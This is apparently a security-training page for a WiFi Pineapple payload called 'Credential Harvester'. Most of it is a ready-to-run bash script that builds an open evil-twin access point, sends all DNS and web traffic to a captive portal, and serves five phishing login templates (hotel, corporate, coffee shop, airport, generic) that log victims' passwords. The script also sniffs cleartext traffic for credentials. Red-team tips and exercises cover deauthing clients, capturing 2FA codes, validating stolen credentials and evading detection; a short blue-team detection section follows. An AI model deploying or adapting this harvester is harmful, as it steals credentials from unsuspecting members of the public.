# PP-A01: Credential Harvester

## Overview

| Attribute | Value |
|-----------|-------|
| **Payload ID** | PP-A01 |
| **Name** | Credential Harvester |
| **Category** | Advanced Attack |
| **Target** | Network Users |
| **Skill Level** | Advanced |
| **Risk Level** | High |

## Description

A comprehensive credential harvesting system that combines Evil Twin AP, captive portal, traffic interception, and form capture to collect user credentials in real-time. Includes multiple phishing templates and automatic credential logging.

---

## Complete Payload

```bash
#!/bin/bash
#####################################################
# Payload: PP-A01 - Credential Harvester
# Target: Network users seeking WiFi
# Category: Advanced Attack
# Author: Security Trainer
# Version: 1.0.0
#
# WARNING: For authorized security testing only
#####################################################

# ============================================
# CONFIGURATION
# ============================================

# Network settings
AP_SSID="${1:-Free_Public_WiFi}"
AP_CHANNEL="${2:-6}"
AP_INTERFACE="wlan0"
GATEWAY_IP="192.168.4.1"
DHCP_RANGE="192.168.4.100,192.168.4.200"
PORTAL_PORT="80"

# Directories
LOOT_DIR="/sd/loot/harvester_$(date +%Y%m%d_%H%M%S)"
CREDS_FILE="$LOOT_DIR/credentials.txt"
CREDS_CSV="$LOOT_DIR/credentials.csv"
LOG_FILE="$LOOT_DIR/harvester.log"
WEB_ROOT="$LOOT_DIR/portal"

# Template selection (generic, hotel, corporate, coffee, airport)
TEMPLATE="${3:-generic}"

# ============================================
# LED FUNCTIONS
# ============================================

LED_BASE="/sys/class/leds"

led() {
    local color="$1"
    local state="$2"
    echo "$state" > "${LED_BASE}/pineapple:${color}:system/brightness" 2>/dev/null
}

led_status() {
    case "$1" in
        "setup")    led "amber" 1; led "green" 0; led "red" 0; led "blue" 0 ;;
        "running")  led "green" 1; led "amber" 0; led "red" 0; led "blue" 0 ;;
        "capture")  led "blue" 1; sleep 0.3; led "blue" 0 ;;
        "success")  led "green" 1; led "blue" 1 ;;
        "error")    led "red" 1 ;;
        "off")      led "red" 0; led "green" 0; led "blue" 0; led "amber" 0 ;;
    esac
}

# ============================================
# LOGGING FUNCTIONS
# ============================================

log() {
    local message="$1"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[$timestamp] $message" | tee -a "$LOG_FILE"
}

log_credential() {
    local username="$1"
    local password="$2"
    local source="$3"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    local client_ip="$4"

    # Log to text file
    echo "========================================" >> "$CREDS_FILE"
    echo "Timestamp: $timestamp" >> "$CREDS_FILE"
    echo "Source: $source" >> "$CREDS_FILE"
    echo "Client IP: $client_ip" >> "$CREDS_FILE"
    echo "Username: $username" >> "$CREDS_FILE"
    echo "Password: $password" >> "$CREDS_FILE"
    echo "========================================" >> "$CREDS_FILE"

    # Log to CSV
    echo "$timestamp,$source,$client_ip,\"$username\",\"$password\"" >> "$CREDS_CSV"

    log "CREDENTIAL CAPTURED: $username from $source"
    led_status "capture"

    # Send notification
    send_alert "Credential captured from $source"
}

send_alert() {
    local message="$1"

    # LED notification
    for i in {1..3}; do
        led "blue" 1
        sleep 0.2
        led "blue" 0
        sleep 0.1
    done

    # Optional: remote notification
    # curl -s "http://your-server/alert?msg=$(urlencode "$message")" &
}

# ============================================
# TEMPLATE GENERATION
# ============================================

generate_portal_template() {
    local template="$1"

    mkdir -p "$WEB_ROOT"

    case "$template" in
        "generic")
            generate_generic_template
            ;;
        "hotel")
            generate_hotel_template
            ;;
        "corporate")
            generate_corporate_template
            ;;
        "coffee")
            generate_coffee_template
            ;;
        "airport")
            generate_airport_template
            ;;
        *)
            generate_generic_template
            ;;
    esac

    # Generate credential capture script
    generate_capture_script
}

generate_generic_template() {
    cat > "$WEB_ROOT/index.html" << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Login Required</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
            max-width: 400px;
            width: 90%;
        }
        h1 { color: #333; margin-bottom: 10px; text-align: center; }
        p { color: #666; margin-bottom: 30px; text-align: center; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 5px; color: #333; font-weight: 500; }
        input[type="text"], input[type="email"], input[type="password"] {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 16px;
        }
        input:focus { border-color: #667eea; outline: none; }
        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border: none;
            border-radius: 5px;
            color: white;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }
        button:hover { opacity: 0.9; }
        .terms { font-size: 12px; color: #999; text-align: center; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Free WiFi Access</h1>
        <p>Sign in to connect to the internet</p>
        <form action="/capture.php" method="POST">
            <div class="form-group">
                <label>Email Address</label>
                <input type="email" name="username" required placeholder="your@email.com">
            </div>
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" required placeholder="Enter password">
            </div>
            <button type="submit">Connect to WiFi</button>
        </form>
        <p class="terms">By connecting, you agree to our Terms of Service</p>
    </div>
</body>
</html>
HTMLEOF
}

generate_hotel_template() {
    cat > "$WEB_ROOT/index.html" << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hotel Guest WiFi</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Georgia', serif;
            background: #f5f5f5;
            min-height: 100vh;
        }
        .header {
            background: #1a1a2e;
            color: gold;
            padding: 20px;
            text-align: center;
        }
        .header h1 { font-size: 28px; letter-spacing: 2px; }
        .container {
            max-width: 450px;
            margin: 40px auto;
            padding: 0 20px;
        }
        .card {
            background: white;
            padding: 40px;
            border-radius: 5px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        h2 { color: #1a1a2e; margin-bottom: 20px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; color: #333; }
        input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 3px;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 14px;
            background: #1a1a2e;
            border: none;
            color: gold;
            font-size: 16px;
            cursor: pointer;
            border-radius: 3px;
        }
        .info { font-size: 13px; color: #666; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="header">
        <h1>GRAND HOTEL</h1>
        <p>Guest WiFi Portal</p>
    </div>
    <div class="container">
        <div class="card">
            <h2>Welcome, Valued Guest</h2>
            <form action="/capture.php" method="POST">
                <div class="form-group">
                    <label>Room Number</label>
                    <input type="text" name="room" required placeholder="e.g., 412">
                </div>
                <div class="form-group">
                    <label>Last Name</label>
                    <input type="text" name="username" required placeholder="Enter last name">
                </div>
                <div class="form-group">
                    <label>Confirmation Code</label>
                    <input type="password" name="password" required placeholder="From your reservation">
                </div>
                <button type="submit">Access Internet</button>
            </form>
            <p class="info">Complimentary WiFi for registered guests. Contact front desk for assistance.</p>
        </div>
    </div>
</body>
</html>
HTMLEOF
}

generate_corporate_template() {
    cat > "$WEB_ROOT/index.html" << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Corporate Network Access</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, sans-serif;
            background: #e8e8e8;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .login-box {
            background: white;
            padding: 40px;
            width: 380px;
            box-shadow: 0 0 20px rgba(0,0,0,0.15);
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo-icon {
            width: 60px;
            height: 60px;
            background: #0078d4;
            border-radius: 5px;
            margin: 0 auto 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 30px;
        }
        h1 { font-size: 20px; color: #333; text-align: center; margin-bottom: 5px; }
        .subtitle { color: #666; text-align: center; font-size: 14px; margin-bottom: 30px; }
        .form-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; color: #333; font-size: 14px; }
        input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            font-size: 14px;
        }
        input:focus { border-color: #0078d4; outline: none; }
        button {
            width: 100%;
            padding: 12px;
            background: #0078d4;
            border: none;
            color: white;
            font-size: 14px;
            cursor: pointer;
            margin-top: 10px;
        }
        .links { margin-top: 20px; font-size: 12px; text-align: center; }
        .links a { color: #0078d4; text-decoration: none; }
    </style>
</head>
<body>
    <div class="login-box">
        <div class="logo">
            <div class="logo-icon">&#9670;</div>
            <h1>Corporate Network</h1>
            <p class="subtitle">Sign in with your company credentials</p>
        </div>
        <form action="/capture.php" method="POST">
            <div class="form-group">
                <label>Username or Email</label>
                <input type="text" name="username" required placeholder="user@company.com">
            </div>
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" required>
            </div>
            <button type="submit">Sign In</button>
        </form>
        <div class="links">
            <a href="#">Forgot password?</a> | <a href="#">IT Help Desk</a>
        </div>
    </div>
</body>
</html>
HTMLEOF
}

generate_coffee_template() {
    cat > "$WEB_ROOT/index.html" << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Coffee Shop WiFi</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Trebuchet MS', sans-serif;
            background: #f9f3e9;
            min-height: 100vh;
        }
        .banner {
            background: #4a3728;
            color: #f9f3e9;
            padding: 30px;
            text-align: center;
        }
        .banner h1 { font-size: 32px; margin-bottom: 5px; }
        .container {
            max-width: 400px;
            margin: 30px auto;
            padding: 0 20px;
        }
        .card {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 3px 15px rgba(0,0,0,0.1);
        }
        h2 { color: #4a3728; margin-bottom: 20px; text-align: center; }
        .social-btn {
            display: block;
            width: 100%;
            padding: 12px;
            margin-bottom: 10px;
            border: 1px solid #ddd;
            background: white;
            border-radius: 5px;
            font-size: 14px;
            cursor: pointer;
        }
        .divider {
            text-align: center;
            margin: 20px 0;
            color: #999;
        }
        .form-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; color: #333; }
        input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
        }
        .connect-btn {
            width: 100%;
            padding: 14px;
            background: #4a3728;
            border: none;
            color: white;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="banner">
        <h1>Coffee House</h1>
        <p>Free WiFi for Customers</p>
    </div>
    <div class="container">
        <div class="card">
            <h2>Connect to WiFi</h2>
            <button class="social-btn" onclick="showForm()">Continue with Facebook</button>
            <button class="social-btn" onclick="showForm()">Continue with Google</button>
            <div class="divider">— or —</div>
            <form action="/capture.php" method="POST">
                <div class="form-group">
                    <label>Email</label>
                    <input type="email" name="username" required placeholder="your@email.com">
                </div>
                <div class="form-group">
                    <label>Create Password (for future visits)</label>
                    <input type="password" name="password" required placeholder="Choose a password">
                </div>
                <button type="submit" class="connect-btn">Get Online</button>
            </form>
        </div>
    </div>
</body>
</html>
HTMLEOF
}

generate_airport_template() {
    cat > "$WEB_ROOT/index.html" << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Airport WiFi</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: Arial, sans-serif;
            background: #f0f0f0;
            min-height: 100vh;
        }
        .header {
            background: #003366;
            color: white;
            padding: 15px 20px;
            display: flex;
            align-items: center;
        }
        .header h1 { font-size: 20px; }
        .container {
            max-width: 500px;
            margin: 30px auto;
            padding: 0 20px;
        }
        .card {
            background: white;
            padding: 30px;
            border-radius: 5px;
        }
        h2 { color: #003366; margin-bottom: 10px; }
        .info { color: #666; margin-bottom: 25px; font-size: 14px; }
        .options { margin-bottom: 25px; }
        .option {
            border: 2px solid #003366;
            padding: 15px;
            margin-bottom: 10px;
            border-radius: 5px;
            cursor: pointer;
        }
        .option.selected { background: #e6f0ff; }
        .option h3 { color: #003366; margin-bottom: 5px; }
        .option p { color: #666; font-size: 13px; }
        .form-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; color: #333; }
        input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 3px;
        }
        button {
            width: 100%;
            padding: 14px;
            background: #003366;
            border: none;
            color: white;
            font-size: 16px;
            cursor: pointer;
            border-radius: 3px;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>International Airport - Free WiFi</h1>
    </div>
    <div class="container">
        <div class="card">
            <h2>Welcome to Airport WiFi</h2>
            <p class="info">Get complimentary internet access. Premium plans available for faster speeds.</p>

            <form action="/capture.php" method="POST">
                <div class="options">
                    <div class="option selected">
                        <input type="radio" name="plan" value="free" checked style="display:none">
                        <h3>Free Access (30 min)</h3>
                        <p>Basic browsing and email</p>
                    </div>
                </div>

                <div class="form-group">
                    <label>Email Address</label>
                    <input type="email" name="username" required placeholder="your@email.com">
                </div>
                <div class="form-group">
                    <label>Booking Reference or Password</label>
                    <input type="password" name="password" required placeholder="Enter reference">
                </div>
                <button type="submit">Connect Now</button>
            </form>
        </div>
    </div>
</body>
</html>
HTMLEOF
}

generate_capture_script() {
    # Create PHP capture script
    cat > "$WEB_ROOT/capture.php" << 'PHPEOF'
<?php
// Log credentials
$timestamp = date('Y-m-d H:i:s');
$username = isset($_POST['username']) ? $_POST['username'] : '';
$password = isset($_POST['password']) ? $_POST['password'] : '';
$room = isset($_POST['room']) ? $_POST['room'] : '';
$client_ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];

// Write to credentials file
$log_entry = "========================================\n";
$log_entry .= "Timestamp: $timestamp\n";
$log_entry .= "Client IP: $client_ip\n";
$log_entry .= "User Agent: $user_agent\n";
if ($room) $log_entry .= "Room: $room\n";
$log_entry .= "Username: $username\n";
$log_entry .= "Password: $password\n";
$log_entry .= "========================================\n";

file_put_contents('/tmp/harvester_creds.txt', $log_entry, FILE_APPEND);

// Redirect to success page
header('Location: /success.html');
exit;
?>
PHPEOF

    # Create success page
    cat > "$WEB_ROOT/success.html" << 'HTMLEOF'
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connected!</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            background: #4CAF50;
            color: white;
            text-align: center;
        }
        .container { padding: 40px; }
        h1 { font-size: 48px; margin-bottom: 20px; }
        p { font-size: 18px; }
    </style>
    <script>
        setTimeout(function() {
            window.location.href = 'http://www.msftconnecttest.com/redirect';
        }, 3000);
    </script>
</head>
<body>
    <div class="container">
        <h1>✓</h1>
        <h2>You're Connected!</h2>
        <p>Redirecting to internet...</p>
    </div>
</body>
</html>
HTMLEOF
}

# ============================================
# NETWORK SETUP
# ============================================

setup_network() {
    log "Setting up network infrastructure..."

    # Stop conflicting services
    pkill hostapd 2>/dev/null
    pkill dnsmasq 2>/dev/null
    pkill php 2>/dev/null
    sleep 2

    # Configure interface
    ip addr flush dev "$AP_INTERFACE" 2>/dev/null
    ip link set "$AP_INTERFACE" down
    ip addr add "$GATEWAY_IP/24" dev "$AP_INTERFACE"
    ip link set "$AP_INTERFACE" up

    # Create hostapd config
    cat > /tmp/hostapd_harvester.conf << EOF
interface=$AP_INTERFACE
driver=nl80211
ssid=$AP_SSID
hw_mode=g
channel=$AP_CHANNEL
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
EOF

    # Create dnsmasq config
    cat > /tmp/dnsmasq_harvester.conf << EOF
interface=$AP_INTERFACE
bind-interfaces
dhcp-range=$DHCP_RANGE,12h
dhcp-option=3,$GATEWAY_IP
dhcp-option=6,$GATEWAY_IP

# Redirect all DNS to our portal
address=/#/$GATEWAY_IP

# Logging
log-queries
log-dhcp
log-facility=/tmp/dnsmasq_harvester.log

dhcp-leasefile=/tmp/harvester_leases
EOF

    log "Network configuration complete"
}

start_services() {
    log "Starting services..."

    # Start hostapd
    hostapd -B /tmp/hostapd_harvester.conf
    if [ $? -ne 0 ]; then
        log "ERROR: Failed to start hostapd"
        return 1
    fi
    log "hostapd started"

    # Start dnsmasq
    dnsmasq -C /tmp/dnsmasq_harvester.conf
    if [ $? -ne 0 ]; then
        log "ERROR: Failed to start dnsmasq"
        return 1
    fi
    log "dnsmasq started"

    # Setup iptables for captive portal
    iptables -F
    iptables -t nat -F

    # Redirect HTTP to our portal
    iptables -t nat -A PREROUTING -i "$AP_INTERFACE" -p tcp --dport 80 -j REDIRECT --to-port "$PORTAL_PORT"
    iptables -t nat -A PREROUTING -i "$AP_INTERFACE" -p tcp --dport 443 -j REDIRECT --to-port "$PORTAL_PORT"

    # Start PHP server for portal
    cd "$WEB_ROOT"
    php -S "$GATEWAY_IP:$PORTAL_PORT" > /tmp/php_server.log 2>&1 &
    log "Web server started on port $PORTAL_PORT"

    return 0
}

# ============================================
# CREDENTIAL MONITOR
# ============================================

monitor_credentials() {
    log "Starting credential monitor..."

    local creds_tmp="/tmp/harvester_creds.txt"
    touch "$creds_tmp"

    # Watch for new credentials
    tail -F "$creds_tmp" 2>/dev/null | while read line; do
        if echo "$line" | grep -q "Username:"; then
            local username=$(echo "$line" | cut -d: -f2 | xargs)
            read line  # Next line is password
            local password=$(echo "$line" | cut -d: -f2 | xargs)

            if [ -n "$username" ] && [ -n "$password" ]; then
                log_credential "$username" "$password" "Portal" "Unknown"
            fi
        fi
    done &
}

# ============================================
# TRAFFIC INTERCEPTION
# ============================================

start_traffic_capture() {
    log "Starting traffic capture..."

    # Capture HTTP credentials in clear text
    tcpdump -i "$AP_INTERFACE" -A -s 0 \
        'tcp port 80 or tcp port 21 or tcp port 25 or tcp port 110' \
        2>/dev/null | \
        grep -iE --line-buffered 'user|pass|login|email|pwd|credential' | \
        tee -a "$LOOT_DIR/traffic_capture.txt" &

    log "Traffic capture running"
}

# ============================================
# CLIENT MONITOR
# ============================================

monitor_clients() {
    log "Starting client monitor..."

    local known_clients="/tmp/harvester_known_clients.txt"
    touch "$known_clients"

    while true; do
        if [ -f /tmp/harvester_leases ]; then
            while read timestamp mac ip hostname clientid; do
                if ! grep -q "$mac" "$known_clients" 2>/dev/null; then
                    echo "$mac" >> "$known_clients"
                    log "NEW CLIENT: $mac - $ip ($hostname)"

                    # Log client details
                    echo "$(date '+%Y-%m-%d %H:%M:%S'),$mac,$ip,$hostname" >> "$LOOT_DIR/clients.csv"
                fi
            done < /tmp/harvester_leases
        fi
        sleep 5
    done &
}

# ============================================
# CLEANUP
# ============================================

cleanup() {
    log "Cleaning up..."
    led_status "off"

    # Stop services
    pkill hostapd 2>/dev/null
    pkill dnsmasq 2>/dev/null
    pkill php 2>/dev/null
    pkill tcpdump 2>/dev/null

    # Flush iptables
    iptables -F
    iptables -t nat -F

    # Reset interface
    ip addr flush dev "$AP_INTERFACE" 2>/dev/null

    # Copy captured credentials to final location
    if [ -f /tmp/harvester_creds.txt ]; then
        cat /tmp/harvester_creds.txt >> "$CREDS_FILE"
    fi

    # Generate summary
    generate_summary

    log "Cleanup complete"
    log "Loot saved to: $LOOT_DIR"

    exit 0
}

generate_summary() {
    local summary="$LOOT_DIR/summary.txt"

    {
        echo "=========================================="
        echo "Credential Harvester Summary"
        echo "=========================================="
        echo "SSID: $AP_SSID"
        echo "Template: $TEMPLATE"
        echo "Started: $(head -1 "$LOG_FILE" | cut -d']' -f1 | tr -d '[')"
        echo "Ended: $(date '+%Y-%m-%d %H:%M:%S')"
        echo ""
        echo "=== Statistics ==="
        echo "Total Credentials: $(grep -c "Username:" "$CREDS_FILE" 2>/dev/null || echo 0)"
        echo "Unique Clients: $(wc -l < "$LOOT_DIR/clients.csv" 2>/dev/null || echo 0)"
        echo ""
        echo "=== Files ==="
        ls -la "$LOOT_DIR/"
    } > "$summary"
}

trap cleanup SIGINT SIGTERM EXIT

# ============================================
# MAIN
# ============================================

main() {
    log "=========================================="
    log "PP-A01: Credential Harvester"
    log "=========================================="
    log "SSID: $AP_SSID"
    log "Channel: $AP_CHANNEL"
    log "Template: $TEMPLATE"

    led_status "setup"

    # Create directories
    mkdir -p "$LOOT_DIR"
    echo "timestamp,source,client_ip,username,password" > "$CREDS_CSV"

    # Generate portal
    log "Generating portal template: $TEMPLATE"
    generate_portal_template "$TEMPLATE"

    # Setup network
    setup_network
    if ! start_services; then
        led_status "error"
        exit 1
    fi

    led_status "running"

    # Start monitors
    monitor_credentials
    monitor_clients
    start_traffic_capture

    log "=========================================="
    log "Credential Harvester ACTIVE"
    log "Waiting for victims..."
    log "=========================================="

    # Keep running
    while true; do
        sleep 60

        # Periodic status update
        local cred_count=$(grep -c "Username:" "$CREDS_FILE" 2>/dev/null || echo 0)
        local client_count=$(wc -l < "$LOOT_DIR/clients.csv" 2>/dev/null || echo 0)
        log "Status: $cred_count credentials, $client_count clients"
    done
}

# ============================================
# EXECUTE
# ============================================

main "$@"
```

---

## Line-by-Line Breakdown

### Configuration Section (Lines 12-30)
| Variable | Purpose |
|----------|---------|
| `AP_SSID` | Name of fake access point |
| `AP_CHANNEL` | WiFi channel to operate on |
| `GATEWAY_IP` | IP address of the captive portal |
| `DHCP_RANGE` | IP range for connected clients |
| `TEMPLATE` | Portal design (generic, hotel, corporate, etc.) |

### Template Generation (Lines 85-350)
Creates HTML/PHP files for different scenarios:
- **Generic**: Simple WiFi login
- **Hotel**: Room number + guest name
- **Corporate**: Company-style SSO
- **Coffee**: Social login options
- **Airport**: Booking reference capture

### Network Setup (Lines 355-415)
1. Stops conflicting services
2. Configures network interface
3. Creates hostapd config (AP daemon)
4. Creates dnsmasq config (DHCP/DNS)
5. All DNS queries redirect to portal

### Credential Capture (Lines 420-445)
- PHP script receives form submissions
- Logs username, password, IP, timestamp
- Redirects to success page
- tail -F monitors for new credentials

### Traffic Interception (Lines 450-465)
- tcpdump captures cleartext protocols
- Filters for credential keywords
- Logs suspicious traffic patterns

---

## Red Team Perspective

### Attack Scenarios

| Scenario | Template | Target |
|----------|----------|--------|
| Public Area | generic | General public |
| Hotel Lobby | hotel | Hotel guests |
| Office Building | corporate | Employees |
| Coffee Shop | coffee | Customers |
| Airport Terminal | airport | Travelers |

### Operational Considerations

1. **SSID Selection**: Use convincing names matching the environment
2. **Signal Strength**: Position for optimal coverage of target area
3. **Duration**: Limit exposure time to reduce detection risk
4. **Deauth**: Optionally deauth clients from real AP to force reconnection

### Enhancement Ideas

- Add social media OAuth phishing
- Include 2FA token capture
- Implement session hijacking
- Add automatic credential validation

---

## Blue Team Perspective

### Detection Methods

| Indicator | Detection Tool |
|-----------|----------------|
| Rogue AP | Wireless IDS, AP surveys |
| Duplicate SSID | WIDS policy alerts |
| DNS redirect | DNS monitoring |
| Certificate errors | Browser warnings |

### Prevention Measures

1. **Employee Training**: Recognize fake WiFi portals
2. **VPN Policy**: Require VPN for any public WiFi
3. **Certificate Pinning**: Detect HTTPS interception
4. **Wireless IDS**: Alert on rogue APs
5. **802.1X**: Require certificate-based auth

### Response Actions

```bash
# Identify rogue AP
airodump-ng wlan0mon --band abg | grep "$COMPANY_SSID"

# Compare BSSIDs to known legitimate
# Alert security team if unknown BSSID found

# Locate physical device via signal triangulation
```

---

## Practice Exercises

### Exercise 1: Custom Template
Create a template for:
- A specific coffee chain
- University campus WiFi
- Airline lounge

### Exercise 2: Multi-Lingual
Add language detection and localized templates.

### Exercise 3: Credential Validation
Add real-time credential testing against target services.

### Exercise 4: Detection Evasion
Research and implement techniques to avoid WIDS detection.

---

## Legal & Ethical Notice

This payload is for **authorized security testing only**. Unauthorized use is illegal and unethical. Always:
- Obtain written permission
- Define scope clearly
- Protect captured data
- Report vulnerabilities responsibly

---

[← Back to Advanced Payloads](README.md) | [Next: PP-A02 Multi-Stage Attack →](PP-A02_Multi_Stage_Attack.md)
